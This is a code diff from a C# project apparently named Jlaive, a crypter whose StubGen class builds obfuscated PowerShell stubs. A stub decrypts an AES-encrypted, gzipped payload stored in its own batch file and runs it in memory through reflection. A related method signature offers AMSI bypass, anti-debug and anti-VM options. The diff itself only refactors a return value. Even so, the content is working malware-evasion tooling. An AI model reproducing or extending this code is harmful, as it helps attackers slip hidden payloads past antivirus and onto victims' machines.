@@ -9,7 +9,7 @@ namespace Jlaive
 {
     public class StubGen
     {
-        public static string CreatePS(byte[] key, byte[] iv, EncryptionMode mode, Random rng)
+        public static (string, string) CreatePS(byte[] key, byte[] iv, EncryptionMode mode, Random rng)
         {
             string varname = RandomString(6, rng);
             string varname2 = RandomString(6, rng);
@@ -23,7 +23,7 @@ namespace Jlaive
             else decryptioncode = "AesManaged aes = new AesManaged(); aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7; ICryptoTransform decryptor = aes.CreateDecryptor(key, iv); byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length); decryptor.Dispose(); aes.Dispose(); return decrypted;";
             string srcclass = Convert.ToBase64String(Encoding.UTF8.GetBytes(@"using System.Text;using System.IO;using System.IO.Compression;using System.Security.Cryptography; public class " + classname + @" { public static byte[] " + functionname + @"(byte[] input, byte[] key, byte[] iv) { " + decryptioncode + @" } public static byte[] " + functionname2 + @"(byte[] bytes) { MemoryStream msi = new MemoryStream(bytes); MemoryStream mso = new MemoryStream(); var gs = new GZipStream(msi, CompressionMode.Decompress); gs.CopyTo(mso); gs.Dispose(); msi.Dispose(); mso.Dispose(); return mso.ToArray(); } }"));
             string command = $"${varname} = [System.IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine);${varname2} = ${varname}[${varname}.Length - 1];${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${base64name}));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname2}([{classname}]::{functionname}([System.Convert]::FromBase64String(${varname2}), [System.Convert]::FromBase64String('{Convert.ToBase64String(key)}'), [System.Convert]::FromBase64String('{Convert.ToBase64String(iv)}')))).EntryPoint.Invoke($null, (, [string[]] ('%*')))";
-            return $"${base64name} = '{srcclass}';" + Obfuscator.GenCodePs(command, rng, 1);
+            return ($"${base64name} = '{srcclass}';", command);
         }
 
         public static string CreateCS(byte[] key, byte[] iv, EncryptionMode mode, bool bamsi, bool antidebug, bool antivm, bool native, Random rng)
